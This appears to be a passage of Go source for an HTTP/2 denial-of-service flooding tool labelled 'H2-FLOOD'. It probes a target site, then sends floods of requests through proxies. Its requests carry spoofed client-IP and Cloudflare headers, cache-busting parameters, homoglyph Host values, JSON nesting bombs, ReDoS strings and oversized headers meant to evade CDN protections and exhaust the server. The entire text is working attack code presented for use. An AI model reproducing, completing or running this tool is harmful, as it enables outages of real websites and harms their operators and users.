		req, _ := http.NewRequest("GET", target, nil)
		req.Header.Set("User-Agent", "Mozilla/5.0")
		req.Header.Set("Accept-Encoding", e)
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		resp.Body.Close()
		if resp.StatusCode >= 200 && resp.StatusCode < 400 {
			valid = append(valid, e)
		}
	}
	if len(valid) == 0 {
		valid = append(valid, "gzip, deflate, br")
	}
	return valid
}

func probeCacheControls(target string) []string {
	controls := []string{"no-cache", "no-store", "max-age=0", "must-revalidate"}
	client := &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	var valid []string
	for _, c := range controls {
		req, _ := http.NewRequest("GET", target, nil)
		req.Header.Set("User-Agent", "Mozilla/5.0")
		req.Header.Set("Cache-Control", c)
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		resp.Body.Close()
		if resp.StatusCode >= 200 && resp.StatusCode < 400 {
			valid = append(valid, c)
		}
	}
	if len(valid) == 0 {
		valid = append(valid, "no-cache")
	}
	return valid
}

func probeAdvancedFeatures(target string, proxyIP string) {
	client := &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	if proxyIP != "" {
		proxyURL, _ := url.Parse("http://" + proxyIP)
		client.Transport.(*http.Transport).Proxy = http.ProxyURL(proxyURL)
	}
	rng := rand.New(rand.NewSource(time.Now().UnixNano()))

	reqWS, _ := http.NewRequest("GET", target, nil)
	reqWS.Header.Set("User-Agent", "Mozilla/5.0")
	reqWS.Header.Set("Connection", "Upgrade")
	reqWS.Header.Set("Upgrade", "websocket")
	reqWS.Header.Set("Sec-WebSocket-Key", randStr(rng, 24))
	reqWS.Header.Set("Sec-WebSocket-Version", "13")
	respWS, err := client.Do(reqWS)
	if err == nil {
		respWS.Body.Close()
		if respWS.StatusCode >= 200 && respWS.StatusCode < 400 {
			probeResult.SupportsWebSocket = true
		}
	}

	reqGRPC, _ := http.NewRequest("GET", target, nil)
	reqGRPC.Header.Set("User-Agent", "Mozilla/5.0")
	reqGRPC.Header.Set("Content-Type", "application/grpc")
	reqGRPC.Header.Set("te", "trailers")
	reqGRPC.Header.Set("grpc-timeout", "10S")
	respGRPC, err := client.Do(reqGRPC)
	if err == nil {
		respGRPC.Body.Close()
		if respGRPC.StatusCode >= 200 && respGRPC.StatusCode < 400 {
			probeResult.SupportsGRPC = true
		}
	}

	reqRange, _ := http.NewRequest("GET", target, nil)
	reqRange.Header.Set("User-Agent", "Mozilla/5.0")
	reqRange.Header.Set("Range", "bytes=0-1024")
	respRange, err := client.Do(reqRange)
	if err == nil {
		respRange.Body.Close()
		if respRange.StatusCode == http.StatusPartialContent || (respRange.StatusCode >= 200 && respRange.StatusCode < 400) {
			probeResult.SupportsRange = true
		}
	}

	var b bytes.Buffer
	w := zlib.NewWriter(&b)
	w.Write([]byte(strings.Repeat("x", 1000)))
	w.Close()
	reqComp, _ := http.NewRequest("POST", target, bytes.NewReader(b.Bytes()))
	reqComp.Header.Set("User-Agent", "Mozilla/5.0")
	reqComp.Header.Set("Content-Encoding", "deflate")
	reqComp.Header.Set("Content-Type", "application/octet-stream")
	respComp, err := client.Do(reqComp)
	if err == nil {
		respComp.Body.Close()
		if respComp.StatusCode >= 200 && respComp.StatusCode < 400 {
			probeResult.SupportsCompression = true
		}
	}

	bodyBuf := &bytes.Buffer{}
	writer := multipart.NewWriter(bodyBuf)
	part, _ := writer.CreateFormFile("file", "test.dat")
	part.Write([]byte(strings.Repeat("x", 1000)))
	writer.Close()
	reqMultipart, _ := http.NewRequest("POST", target, bodyBuf)
	reqMultipart.Header.Set("User-Agent", "Mozilla/5.0")
	reqMultipart.Header.Set("Content-Type", writer.FormDataContentType())
	respMultipart, err := client.Do(reqMultipart)
	if err == nil {
		respMultipart.Body.Close()
		if respMultipart.StatusCode >= 200 && respMultipart.StatusCode < 400 {
			probeResult.SupportsMultipart = true
		}
	}

	jsonPayload := `{"test":"data"}`
	reqJSON, _ := http.NewRequest("POST", target, strings.NewReader(jsonPayload))
	reqJSON.Header.Set("User-Agent", "Mozilla/5.0")
	reqJSON.Header.Set("Content-Type", "application/json")
	respJSON, err := client.Do(reqJSON)
	if err == nil {
		respJSON.Body.Close()
		if respJSON.StatusCode >= 200 && respJSON.StatusCode < 400 {
			probeResult.SupportsJSON = true
		}
	}

	redosPayload := strings.Repeat("a", 1000) + "!"
	reqReDOS, _ := http.NewRequest("POST", target, strings.NewReader(redosPayload))
	reqReDOS.Header.Set("User-Agent", "Mozilla/5.0")
	reqReDOS.Header.Set("Content-Type", "text/plain")
	respReDOS, err := client.Do(reqReDOS)
	if err == nil {
		respReDOS.Body.Close()
		if respReDOS.StatusCode >= 200 && respReDOS.StatusCode < 400 {
			probeResult.SupportsReDOS = true
		}
	}

	reqCookies, _ := http.NewRequest("GET", target, nil)
	reqCookies.Header.Set("User-Agent", "Mozilla/5.0")
	reqCookies.Header.Set("Cookie", "test=1; session=abc")
	respCookies, err := client.Do(reqCookies)
	if err == nil {
		respCookies.Body.Close()
		if respCookies.StatusCode >= 200 && respCookies.StatusCode < 400 {
			probeResult.SupportsCookies = true
		}
	}

	reqKeepAlive, _ := http.NewRequest("GET", target, nil)
	reqKeepAlive.Header.Set("User-Agent", "Mozilla/5.0")
	reqKeepAlive.Header.Set("Connection", "keep-alive")
	reqKeepAlive.Header.Set("Keep-Alive", "timeout=9999, max=9999")
	respKeepAlive, err := client.Do(reqKeepAlive)
	if err == nil {
		respKeepAlive.Body.Close()
		if respKeepAlive.StatusCode >= 200 && respKeepAlive.StatusCode < 400 {
			probeResult.SupportsKeepAlive = true
		}
	}

	parsed, _ := url.Parse(target)
	host := parsed.Hostname()
	conn, err := tls.Dial("tcp", net.JoinHostPort(host, "443"), &tls.Config{
		InsecureSkipVerify: true,
		NextProtos:         []string{"h2"},
	})
	if err == nil {
		defer conn.Close()
		if conn.ConnectionState().NegotiatedProtocol == "h2" {
			probeResult.SupportsHTTP2Push = true
			probeResult.SupportsPing = true
			probeResult.SupportsSettings = true
			probeResult.SupportsWindowUpdate = true
			probeResult.MaxConcurrentStreams = 100
			probeResult.InitialWindowSize = 65535
			probeResult.MaxFrameSize = 16384
			probeResult.HeaderTableSize = 4096
		}
	}
}

func loadCookieFromFile(target string) string {
	parsed, _ := url.Parse(target)
	host := parsed.Hostname()
	fname := strings.ReplaceAll(host, ".", "_") + ".cookie"
	data, err := os.ReadFile(fname)
	if err != nil {
		return ""
	}
	return strings.TrimSpace(string(data))
}

func main() {
	if len(os.Args) < 4 {
		fmt.Println("Usage: go run main.go <target> <duration_seconds> <proxyfile>")
		fmt.Println("Example: go run main.go https://target.com 60 proxies.txt")
		os.Exit(1)
	}
	target := os.Args[1]
	duration, _ := strconv.Atoi(os.Args[2])
	proxyFile := os.Args[3]

	var proxies []*url.URL
	file, err := os.Open(proxyFile)
	if err == nil {
		defer file.Close()
		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			line := strings.TrimSpace(scanner.Text())
			if line == "" {
				continue
			}
			if !strings.HasPrefix(line, "http://") && !strings.HasPrefix(line, "https://") {
				line = "http://" + line
			}
			if p, err := url.Parse(line); err == nil {
				proxies = append(proxies, p)
			}
		}
	}
	if len(proxies) == 0 {
		proxies = append(proxies, nil)
	}

	globalCookie = loadCookieFromFile(target)
	if globalCookie != "" {
		fmt.Printf("[INFO] Loaded cookie from file\n")
	}

	parsedTarget, _ := url.Parse(target)
	host := parsedTarget.Hostname()
	if strings.HasPrefix(host, "www.") {
		host = host[4:]
	}

	proxyIPs := []string{}
	for _, p := range proxies {
		if p != nil {
			proxyIPs = append(proxyIPs, p.Hostname())
		}
	}
	if len(proxyIPs) == 0 {
		proxyIPs = []string{"127.0.0.1", "8.8.8.8", "1.1.1.1", "192.168.1.1", "10.0.0.1"}
	}
	firstProxyIP := ""
	if len(proxyIPs) > 0 {
		firstProxyIP = proxyIPs[0]
	}

	fmt.Println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
	fmt.Println("[PROBING] Starting deep probe...")
	var wg sync.WaitGroup
	wg.Add(11)

	probeDone := 0
	var probeMu sync.Mutex
	printProbe := func(name string) {
		probeMu.Lock()
		probeDone++
		done := probeDone
		probeMu.Unlock()
		fmt.Printf("[PROBE] %-15s ▶ %d%%\n", name, (done*100)/11)
	}

	go func() {
		defer wg.Done()
		probeResult.MaxPayload = probeMaxPayload(target)
		printProbe("MaxPayload")
	}()
	go func() {
		defer wg.Done()
		probeResult.MaxHeader = probeMaxHeader(target)
		printProbe("MaxHeader")
	}()
	go func() {
		defer wg.Done()
		probeResult.SupportedHeaders = probeHeaderBypass(target, firstProxyIP)
		printProbe("HeaderBypass")
	}()
	go func() {
		defer wg.Done()
		probeResult.HTTPVersion = probeHTTPVersion(target)
		printProbe("HTTPVersion")
	}()
	go func() {
		defer wg.Done()
		probeResult.ValidOrigins = probeOrigins(target)
		printProbe("Origins")
	}()
	go func() {
		defer wg.Done()
		probeResult.ValidUserAgents = probeUserAgents(target)
		printProbe("UserAgents")
	}()
	go func() {
		defer wg.Done()
		probeResult.ValidReferers = probeReferers(target)
		printProbe("Referers")
	}()
	go func() {
		defer wg.Done()
		probeResult.ValidMethods = probeMethods(target)
		printProbe("Methods")
	}()
	go func() {
		defer wg.Done()
		probeResult.ValidEncodings = probeEncodings(target)
		printProbe("Encodings")
	}()
	go func() {
		defer wg.Done()
		probeResult.ValidCacheControls = probeCacheControls(target)
		printProbe("CacheControls")
	}()
	go func() {
		defer wg.Done()
		probeAdvancedFeatures(target, firstProxyIP)
		printProbe("Advanced")
	}()
	wg.Wait()

	// Safety checks: ensure slices are not empty
	if len(probeResult.ValidMethods) == 0 {
		probeResult.ValidMethods = []string{"GET"}
	}
	if len(probeResult.ValidUserAgents) == 0 {
		probeResult.ValidUserAgents = []string{"Mozilla/5.0"}
	}
	if len(probeResult.ValidReferers) == 0 {
		probeResult.ValidReferers = []string{""}
	}
	if len(probeResult.ValidEncodings) == 0 {
		probeResult.ValidEncodings = []string{"gzip, deflate, br"}
	}
	if len(probeResult.ValidCacheControls) == 0 {
		probeResult.ValidCacheControls = []string{"no-cache"}
	}
	if len(probeResult.ValidOrigins) == 0 {
		probeResult.ValidOrigins = []string{""}
	}
	if probeResult.SupportedHeaders == nil {
		probeResult.SupportedHeaders = make(map[string]bool)
	}

	fmt.Println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n")

	fmt.Printf("%s", MASA_DEPAN_NYA)
	fmt.Println("\n:::::::-.  :::::::::      .,~:::::    .:::.")
	fmt.Printf("%s", PUNYA_LU_PUCAT)
	fmt.Println(" ;;,   `';,'`````;;;    ,;;;'````'   ,;'``;.")
	fmt.Printf("%s", PUNYAMU)
	fmt.Println(" `[[     [[    .n[['    [[[          ''  ,['")
	fmt.Printf("%s", PUCAT)
	fmt.Println("  $$,    $$  ,$$P\" cccc $$$          .c$$P'")
	fmt.Printf("%s", MERAH)
	fmt.Println("  888_,o8P',888bo,_     `88bo,__,o, d88 _,oo,")
	fmt.Printf("%s", CANDY)
	fmt.Println("  MMMMP\"`   `\"\"*UMM       \"YUMMMMMP\"MMMUP*\"^^")
	fmt.Printf("%s", HAPUS)
	fmt.Printf("%s━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━%s\n", MERAH, HAPUS)

	printInfo := func(label, value, status string) {
		if status != "" {
			fmt.Printf("%s〇%s %s%s%s %s:%s %s%s%s %s[%s%s%s]\n",
				IJO, HAPUS,
				PUTIH, label, HAPUS,
				MERAH, HAPUS,
				PUTIH, value, HAPUS,
				MERAH, IJO, status, MERAH,
			)
		} else {
			fmt.Printf("%s〇%s %s%s%s %s:%s %s%s%s\n",
				IJO, HAPUS,
				PUTIH, label, HAPUS,
				MERAH, HAPUS,
				PUTIH, value, HAPUS)
		}
	}

	printInfo("Author", "Diz Flyze Ofc              ", "True")
	printInfo("Target", host, "")
	printInfo("Port  ", "443                        ", "True")
	printInfo("Method", "H2-FLOOD                   ", "True")
	printInfo("Proxy ", fmt.Sprintf("%d                        ", len(proxies)), "True")
	printInfo("Worker", fmt.Sprintf("%d                       ", WORKER_COUNT), "True")
	printInfo("HTTP  ", fmt.Sprintf("%-24s   ", probeResult.HTTPVersion), "True")
	if globalCookie != "" {
		fmt.Printf("%s〇%s %sCookie%s %s:%s %s                            [%s%s%s]\n",
			IJO, HAPUS,
			PUTIH, HAPUS,
			MERAH, HAPUS,
			MERAH, IJO, "True", MERAH)
	} else {
		fmt.Printf("%s〇%s %sCookie%s %s:%s %s                            [%s%s%s]\n",
			IJO, HAPUS,
			PUTIH, HAPUS,
			MERAH, HAPUS,
			PUTIH, IJO, "None", PUTIH)
	}
	fmt.Printf("%s━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━%s\n", MERAH, HAPUS)

	startTime := time.Now()
	ctx, cancel := context.WithCancel(context.Background())
	go func() {
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-ctx.Done():
				fmt.Printf("\r%*s\r", 80, "")
				return
			case <-ticker.C:
				elapsed := int(time.Since(startTime).Seconds())
				if elapsed > duration && duration > 0 {
					elapsed = duration
				}
				fmt.Printf("\r%s〇%s %sTime  %s %s:%s %s%02d/%ds%s                    %s[%s%s%s]\033[K",
					IJO, HAPUS,
					PUTIH, HAPUS,
					MERAH, HAPUS,
					PUTIH, elapsed, duration, HAPUS,
					MERAH, IJO, "True", MERAH)
			}
		}
	}()
	var wg2 sync.WaitGroup
	if duration > 0 {
		time.AfterFunc(time.Duration(duration)*time.Second, func() {
			cancel()
		})
	}

	type clientWrap struct {
		client *http.Client
		ip     string
	}
	clients := make([]clientWrap, len(proxies))
	for i, proxyURL := range proxies {
		tr := &http.Transport{
			DialContext: (&net.Dialer{
				Timeout:   4 * time.Second,
				KeepAlive: KEEP_ALIVE,
			}).DialContext,
			DisableKeepAlives:     false,
			DisableCompression:    false,
			MaxIdleConns:          10000,
			MaxIdleConnsPerHost:   5000,
			MaxConnsPerHost:       0,
			IdleConnTimeout:       KEEP_ALIVE,
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify:      true,
				MinVersion:              tls.VersionTLS12,
				MaxVersion:              tls.VersionTLS13,
				NextProtos:              []string{"h2", "h2-14", "h2-15", "http/1.1"},
				CipherSuites: []uint16{
					tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
					tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
					tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
					tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
					tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
					tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
				},
				Renegotiation:          tls.RenegotiateOnceAsClient,
				SessionTicketsDisabled: false,
				ClientSessionCache:     tls.NewLRUClientSessionCache(1000),
			},
			ForceAttemptHTTP2:     true,
			TLSHandshakeTimeout:   4 * time.Second,
			ResponseHeaderTimeout: 4 * time.Second,
			ExpectContinueTimeout: 0 * time.Second,
		}
		_ = http2.ConfigureTransport(tr)
		ip := ""
		if proxyURL != nil {
			tr.Proxy = http.ProxyURL(proxyURL)
			ip = proxyURL.Hostname()
		}
		jar, _ := cookiejar.New(nil)
		clients[i] = clientWrap{
			client: &http.Client{Transport: tr, Timeout: TIMEOUT, Jar: jar},
			ip:     ip,
		}
	}

	type headerItem struct{ key, value string }

	for w := 0; w < WORKER_COUNT; w++ {
		wg2.Add(1)
		cw := clients[w%len(clients)]
		go func(cli clientWrap, workerID int) {
			defer wg2.Done()
			rng := rand.New(rand.NewSource(time.Now().UnixNano() + int64(workerID)))

			for ctx.Err() == nil {
				method := probeResult.ValidMethods[rng.Intn(len(probeResult.ValidMethods))]
				ua := probeResult.ValidUserAgents[rng.Intn(len(probeResult.ValidUserAgents))]
				if rng.Intn(10) < 3 && len(botUAs) > 0 {
					ua = botUAs[rng.Intn(len(botUAs))]
				}
				ref := probeResult.ValidReferers[rng.Intn(len(probeResult.ValidReferers))]
				enc := probeResult.ValidEncodings[rng.Intn(len(probeResult.ValidEncodings))]
				cacheCtrl := probeResult.ValidCacheControls[rng.Intn(len(probeResult.ValidCacheControls))]

				forIP := proxyIPs[rng.Intn(len(proxyIPs))]
				realIP := cli.ip
				if realIP == "" {
					realIP = forIP
				}

				origin := probeResult.ValidOrigins[rng.Intn(len(probeResult.ValidOrigins))]
				referer := ref
				if origin != "" {
					for _, r := range probeResult.ValidReferers {
						if strings.Contains(r, host) || strings.Contains(r, "google") || strings.Contains(r, "bing") {
							referer = r
							break
						}
					}
				}
				secFetchSite := "cross-site"
				if strings.Contains(origin, host) {
					secFetchSite = "same-origin"
				}

				prof := PFS[rng.Intn(len(PFS))]

				finalURL := generateCacheBypassParams(target, rng, probeResult.MaxPayload, &probeResult)

				var body io.Reader
				var bodyBytes []byte

				if probeResult.SupportsCompression && rng.Intn(3) == 0 {
					var b bytes.Buffer
					w := zlib.NewWriter(&b)
					w.Write([]byte(strings.Repeat("x", 10000+rng.Intn(10000))))
					w.Close()
					bodyBytes = b.Bytes()
					body = bytes.NewReader(bodyBytes)
				} else if probeResult.SupportsMultipart && rng.Intn(4) == 0 {
					bodyBuf := &bytes.Buffer{}
					writer := multipart.NewWriter(bodyBuf)
					part, _ := writer.CreateFormFile("file", "large.dat")
					part.Write([]byte(strings.Repeat("x", 1024*10)))
					writer.Close()
					bodyBytes = bodyBuf.Bytes()
					body = bytes.NewReader(bodyBytes)
				} else if probeResult.SupportsJSON && rng.Intn(6) == 0 {
					jsonBomb := `{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{}}}}}}}}}}}}}}}}}}}}}}`
					bodyBytes = []byte(jsonBomb)
					body = bytes.NewReader(bodyBytes)
				} else if probeResult.SupportsReDOS && rng.Intn(8) == 0 {
					payload := strings.Repeat("a", 1000) + "!"
					bodyBytes = []byte(payload)
					body = bytes.NewReader(bodyBytes)
				}

				req, _ := http.NewRequest(method, finalURL, body)
				if len(bodyBytes) > 0 {
					if rng.Intn(3) == 0 {
						req.Header.Set("Content-Encoding", "deflate")
					} else if rng.Intn(4) == 0 {
						req.Header.Set("Content-Type", "multipart/form-data; boundary="+randStr(rng, 8))
					} else if rng.Intn(6) == 0 {
						req.Header.Set("Content-Type", "application/json")
					}
					req.ContentLength = int64(len(bodyBytes))
				}

				headers := []headerItem{}

				if method == "POST" || method == "PUT" || method == "PATCH" {
					headers = append(headers, headerItem{"Content-Type", "application/x-www-form-urlencoded"})
				}

				headers = append(headers, headerItem{"User-Agent", ua})
				headers = append(headers, headerItem{"Accept-Encoding", enc})
				headers = append(headers, headerItem{"Cache-Control", cacheCtrl})

				if rng.Intn(2) == 0 {
					if rng.Intn(2) == 0 {
						headers = append(headers, headerItem{"Referer", "https://cloudflare.com/"})
					} else {
						headers = append(headers, headerItem{"Referer", "https://" + host + "/"})
					}
				} else if referer != "" {
					headers = append(headers, headerItem{"Referer", referer})
				}
				if origin != "" {
					headers = append(headers, headerItem{"Origin", origin})
				}
				headers = append(headers, headerItem{"Sec-Fetch-Site", secFetchSite})

				headers = append(headers, headerItem{"Accept", prof.Accept})
				headers = append(headers, headerItem{"Accept-Language", prof.Lang})
				headers = append(headers, headerItem{"Connection", "keep-alive"})
				headers = append(headers, headerItem{"Pragma", "no-cache"})
				headers = append(headers, headerItem{"Upgrade-Insecure-Requests", "1"})
				headers = append(headers, headerItem{"If-Modified-Since", time.Now().AddDate(-1, 0, 0).Format(time.RFC1123)})
				headers = append(headers, headerItem{"X-Cache-Buster", strconv.FormatInt(rng.Int63(), 16)})

				if prof.SecChUa != "" {
					headers = append(headers, headerItem{"Sec-Ch-Ua", prof.SecChUa})
					headers = append(headers, headerItem{"Sec-Ch-Ua-Mobile", prof.SecChUaMov})
					headers = append(headers, headerItem{"Sec-Ch-Ua-Platform", prof.SecChUaPlat})
				}
				headers = append(headers, headerItem{"Sec-Fetch-Mode", prof.SecFetchMode})
				headers = append(headers, headerItem{"Sec-Fetch-Dest", prof.SecFetchDest})
				if prof.DNT != "" {
					headers = append(headers, headerItem{"DNT", prof.DNT})
				}

				if rng.Intn(3) == 0 {
					headers = append(headers, headerItem{"TE", "trailers"})
				}
				if rng.Intn(4) == 0 {
					headers = append(headers, headerItem{"A-IM", "Feed"})
				}
				if rng.Intn(4) == 0 {
					headers = append(headers, headerItem{"Delta-Base", "12340001"})
				}
				if rng.Intn(3) == 0 {
					headers = append(headers, headerItem{"dnt", "1"})
				}
				if rng.Intn(4) == 0 {
					headers = append(headers, headerItem{"Access-Control-Request-Method", "GET"})
				}
				if rng.Intn(5) == 0 {
					headers = append(headers, headerItem{"source-ip", randStr(rng, 5)})
				}
				if rng.Intn(4) == 0 {
					headers = append(headers, headerItem{"Data-Return", "false"})
				}

				if rng.Intn(2) == 0 {
					headers = append(headers, headerItem{"X-Forwarded-For", "127.0.0.1, 10.0.0.1, 192.168.1.1"})
					headers = append(headers, headerItem{"X-Forwarded-Host", "localhost"})
					headers = append(headers, headerItem{"X-Forwarded-Proto", "http"})
					headers = append(headers, headerItem{"X-Real-IP", "127.0.0.1"})
				}

				if probeResult.SupportsKeepAlive && rng.Intn(4) == 0 {
					headers = append(headers, headerItem{"Keep-Alive", "timeout=9999, max=9999"})
					headers = append(headers, headerItem{"Connection", "keep-alive"})
				}

				if rng.Intn(5) == 0 {
					hosts := []string{
						host,
						"www." + host,
						"api." + host,
						"cdn." + host,
						"static." + host,
						"dev." + host,
						"test." + host,
					}
					headers = append(headers, headerItem{"Host", hosts[rng.Intn(len(hosts))]})
				}

				if rng.Intn(10) == 0 {
					homoglyphs := map[string]string{
						"a": "\u0430",
						"e": "\u0455",
						"o": "\u043e",
						"p": "\u0440",
						"c": "\u0441",
					}
					domain := host
					for k, v := range homoglyphs {
						domain = strings.ReplaceAll(domain, k, v)
					}
					headers = append(headers, headerItem{"Host", domain})
				}

				for h, supported := range probeResult.SupportedHeaders {
					if supported && rng.Intn(3) == 0 {
						switch h {
						case "X-Forwarded-For":
							headers = append(headers, headerItem{"X-Forwarded-For", realIP + ", " + randIP(rng) + ", " + randIP(rng)})
						case "X-Forwarded":
							headers = append(headers, headerItem{"X-Forwarded", "for=" + realIP})
						case "Forwarded-For":
							headers = append(headers, headerItem{"Forwarded-For", realIP})
						case "X-Real-IP", "X-Originating-IP", "X-Remote-IP", "X-Remote-Addr", "X-Client-IP":
							headers = append(headers, headerItem{h, realIP})
						case "X-Host", "X-Forwarded-Host", "X-Original-Host", "X-Backend-Host":
							headers = append(headers, headerItem{h, host})
						case "X-Original-URL", "X-Rewrite-URL":
							headers = append(headers, headerItem{h, "/" + randStr(rng, 8)})
						case "CF-Connecting-IP", "True-Client-IP", "X-CDN-IP", "X-CDN-Client-IP", "X-Akamai-Client-IP", "Fastly-Client-IP", "Fastly-Orig-IP":
							headers = append(headers, headerItem{h, realIP})
						case "CDN-Loop", "X-CDN":
							headers = append(headers, headerItem{h, "cloudflare"})
						case "CF-IPCountry":
							headers = append(headers, headerItem{"CF-IPCountry", randomElement([]string{"US", "GB", "DE", "FR", "JP", "AU", "CA", "ID", "SG"})})
						case "CF-Ray":
							headers = append(headers, headerItem{"CF-Ray", randHex(16) + "-" + randomElement([]string{"FRA", "AMS", "LHR", "CDG", "SIN", "NRT"})})
						case "CF-Visitor":
							headers = append(headers, headerItem{"CF-Visitor", `{"scheme":"https"}`})
						case "CF-Edge-IP", "X-Server-IP", "X-Cluster-IP", "X-Gateway-IP", "X-Proxy-IP", "X-LB-IP", "X-Edge-IP", "X-Source-IP", "X-Destination-IP":
							headers = append(headers, headerItem{h, realIP})
						case "X-Akamai-Translated":
							headers = append(headers, headerItem{"X-Akamai-Translated", "true"})
						case "X-Request-ID", "X-Request-Id":
							headers = append(headers, headerItem{h, strconv.FormatInt(rng.Int63(), 16)})
						case "X-Correlation-ID", "X-Session-ID", "X-Trace-ID", "X-Cache-Key":
							headers = append(headers, headerItem{h, randHex(16)})
						case "X-Forwarded-Protocol", "X-Forwarded-Scheme", "X-Forwarded-Proto":
							headers = append(headers, headerItem{h, "https"})
						case "X-HTTP-Method-Override", "X-Method-Override":
							headers = append(headers, headerItem{h, randomElement([]string{"PUT", "DELETE", "PATCH", "OPTIONS"})})
						case "X-Cache-Bypass":
							headers = append(headers, headerItem{"X-Cache-Bypass", randHex(8)})
						case "X-Cache-Status":
							headers = append(headers, headerItem{"X-Cache-Status", randomElement([]string{"BYPASS", "DYNAMIC", "EXPIRED", "HIT", "MISS"})})
						case "X-Compression-Hint":
							headers = append(headers, headerItem{"X-Compression-Hint", "gzip"})
						case "X-Accept-Encoding":
							headers = append(headers, headerItem{"X-Accept-Encoding", "gzip, deflate, br"})
						case "X-Forwarded-User":
							headers = append(headers, headerItem{"X-Forwarded-User", randStr(rng, 8)})
						case "X-Forwarded-Agent":
							headers = append(headers, headerItem{"X-Forwarded-Agent", "Mozilla/5.0"})
						default:
							headers = append(headers, headerItem{h, randStr(rng, 8)})
						}
					}
				}

				if probeResult.MaxHeader > 0 && rng.Intn(2) == 0 {
					size := probeResult.MaxHeader/2 + rng.Intn(probeResult.MaxHeader/2)
					if size < 1 {
						size = 512
					}
					headers = append(headers, headerItem{"X-Large-Data", strings.Repeat("x", size)})
				}

				var cookies []string
				if globalCookie != "" {
					cookies = append(cookies, globalCookie)
				}
				cookies = append(cookies, generateBypassCookie())
				for _, name := range cookieNames {
					if rng.Intn(2) == 0 {
						cookies = append(cookies, name+"="+strconv.FormatInt(rng.Int63(), 16))
					}
				}
				if len(cookies) > 0 {
					headers = append(headers, headerItem{"Cookie", strings.Join(cookies, "; ")})
				}

				if probeResult.SupportsCookies && rng.Intn(3) == 0 {
					parsed, _ := url.Parse(target)
					for i := 0; i < 50; i++ {
						cli.client.Jar.SetCookies(parsed, []*http.Cookie{
							{Name: "cookie_" + strconv.Itoa(i), Value: randHex(16)},
						})
					}
				}

				headers = append(headers, headerItem{"X-Forwarded-For", realIP})
				headers = append(headers, headerItem{"X-Real-IP", realIP})

				if probeResult.SupportsRange && rng.Intn(2) == 0 {
					ranges := []string{
						"bytes=0-1024",
						"bytes=2048-4096",
						"bytes=1024-2048",
						"bytes=-512",
						"bytes=512-",
					}
					headers = append(headers, headerItem{"Range", ranges[rng.Intn(len(ranges))]})
				}

				if rng.Intn(3) == 0 {
					etags := []string{}
					for i := 0; i < 10; i++ {
						etags = append(etags, `"`+randHex(16)+`"`)
					}
					headers = append(headers, headerItem{"If-Match", strings.Join(etags, ", ")})
				}

				if rng.Intn(5) == 0 {
					headers = append(headers, headerItem{"Cache-Control", "no-cache, no-store, must-revalidate"})
					headers = append(headers, headerItem{"Pragma", "no-cache"})
					headers = append(headers, headerItem{"X-Cache-Purge", "*"})
				}

				headers = append(headers, headerItem{"If-None-Match", `"` + randStr(rng, 16) + `"`})
				headers = append(headers, headerItem{"Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"})
				headers = append(headers, headerItem{"Accept-Language", "en-US,en;q=0.9,id;q=0.8"})
				headers = append(headers, headerItem{"X-Forwarded-For", realIP + ", " + randIP(rng)})
				headers = append(headers, headerItem{"X-Originating-IP", realIP})
				headers = append(headers, headerItem{"X-Remote-IP", realIP})
				headers = append(headers, headerItem{"X-Remote-Addr", realIP})
				headers = append(headers, headerItem{"X-Client-IP", realIP})

				if probeResult.SupportsWebSocket {
					headers = append(headers, headerItem{"Sec-WebSocket-Key", randStr(rng, 24)})
					headers = append(headers, headerItem{"Sec-WebSocket-Version", "13"})
					if rng.Intn(3) == 0 {
						headers = append(headers, headerItem{"Upgrade", "websocket"})
						headers = append(headers, headerItem{"Connection", "Upgrade"})
					}
				}

				if probeResult.SupportsGRPC && rng.Intn(8) == 0 {
					headers = append(headers, headerItem{"Content-Type", "application/grpc"})
					headers = append(headers, headerItem{"te", "trailers"})
					headers = append(headers, headerItem{"grpc-timeout", "10S"})
				}

				cacheHeaders := generateCacheHeaders(rng)
				for k, v := range cacheHeaders {
					headers = append(headers, headerItem{k, v})
				}

				rng.Shuffle(len(headers), func(i, j int) {
					headers[i], headers[j] = headers[j], headers[i]
				})
				req.Header = make(http.Header)
				for _, h := range headers {
					req.Header.Set(h.key, h.value)
				}

				if cli.client == nil {
					continue
				}
				resp, err := cli.client.Do(req)
				if err == nil {
					io.Copy(io.Discard, resp.Body)
					resp.Body.Close()
				}
			}
		}(cw, w)
	}

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
	select {
	case <-sig:
		cancel()
	case <-ctx.Done():
	}
	wg2.Wait()
	fmt.Println()
}
